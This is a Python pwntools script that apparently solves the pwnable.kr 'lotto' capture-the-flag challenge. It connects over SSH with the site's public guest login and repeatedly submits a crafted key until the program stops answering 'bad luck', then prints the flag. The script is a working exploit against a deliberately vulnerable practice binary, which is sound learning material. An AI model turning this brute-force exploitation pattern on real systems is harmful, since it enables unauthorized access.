from pwn import *

context.arch = "amd64"
context.os   = "linux"
context.bits = 64

key = "######"

sh = ssh(host="pwnable.kr", user="lotto", password="guest", port=2222)

p = sh.process("lotto")
p.recv()

while True:
    p.sendline("1")
    p.recv()
    p.sendline(key)
    response = p.recv()
    if "bad luck" not in response:
        print response.split("\n")[1]
        break

# p.interactive()
p.close()
